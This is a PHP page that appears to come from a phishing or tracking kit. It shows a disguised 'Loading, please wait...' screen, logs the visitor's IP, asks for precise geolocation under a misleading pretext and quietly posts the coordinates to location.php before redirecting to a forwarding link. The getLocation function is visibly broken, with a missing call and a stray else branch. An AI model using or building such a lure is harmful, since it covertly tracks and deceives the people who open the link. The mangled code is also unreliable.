<?php
// Start session and set security headers
session_start();
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header('Content-Security-Policy: default-src \'self\'; script-src \'self\' https://www.google.com https://www.gstatic.com; style-src \'self\' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \'self\' data: https:; media-src \'self\'; connect-src \'self\';');

// Include IP handling with validation
if (file_exists('ip.php')) {
    include 'ip.php';
}

// Log access
$log_message = date('Y-m-d H:i:s') . " - " . $_SERVER['REMOTE_ADDR'] . " accessed " . $_SERVER['PHP_SELF'] . "\n";
file_put_contents('access.log', $log_message, FILE_APPEND);

// Add JavaScript to capture location with improved error handling and security
echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' https://www.google.com https://www.gstatic.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; media-src 'self'; connect-src 'self';">
    <title>Loading...</title>
    <script>
        /**
         * Enhanced debug logging with rate limiting
         */
        const debugLog = (() => {
            const MAX_LOGS_PER_MINUTE = 10;
            let logCount = 0;
            let lastReset = Date.now();
            
            return function(message) {
                // Reset counter if a minute has passed
                if (Date.now() - lastReset > 60000) {
                    logCount = 0;
                    lastReset = Date.now();
                }
                
                // Only log essential location data and respect rate limit
                if ((message.includes("Lat:") || message.includes("Latitude:") || 
                     message.includes("Position obtained successfully")) && 
                    logCount < MAX_LOGS_PER_MINUTE) {
                    
                    console.log("DEBUG: " + message);
                    logCount++;
                    
                    // Send to server with error handling
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open("POST", "debug_log.php", true);
                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        xhr.timeout = 5000; // 5 second timeout
                        xhr.onerror = () => console.error("Failed to send debug log");
                        xhr.ontimeout = () => console.error("Debug log request timed out");
                        xhr.send("message=" + encodeURIComponent(message));
                    } catch (e) {
                        console.error("Error in debugLog:", e);
                    }
                }
            };
        })();
        
        /**
         * Get geolocation with improved error handling and user feedback
         */
        function getLocation() {
            const statusElement = document.getElementById("locationStatus");
            if (!statusElement) return;
            
            if (!navigator.geolocation) {
                statusElement.innerText = "Geolocation is not supported by your browser";
                return;
            }

            // Show permission request message
            statusElement.innerText = "Requesting location permission...";
            
            const options = {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                // Don\'t log this message
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                // Redirect after a delay if geolocation is not supported
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // Don\'t log this message
                    
                    // Add a delay before redirecting to ensure data is processed
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                // Don\'t log this message
                // Still redirect even if there was an error
                redirectToMainPage();
            };
            
            // Send the data with a timestamp to avoid caching
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            // Don\'t log error messages
            
            document.getElementById("locationStatus").innerText = "Redirecting...";
            
            // If user denies location permission or any other error, still redirect after a short delay
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            // Don\'t log this message
            // Try to redirect to the template page
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                // Don\'t log this message
                // Fallback redirection
                window.location = "forwarding_link/index2.html";
            }
        }
        
        // Try to get location when page loads
        window.onload = function() {
            // Don\'t log this message
            setTimeout(function() {
                getLocation();
            }, 500); // Small delay to ensure everything is loaded
        };
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
';
exit;
?>
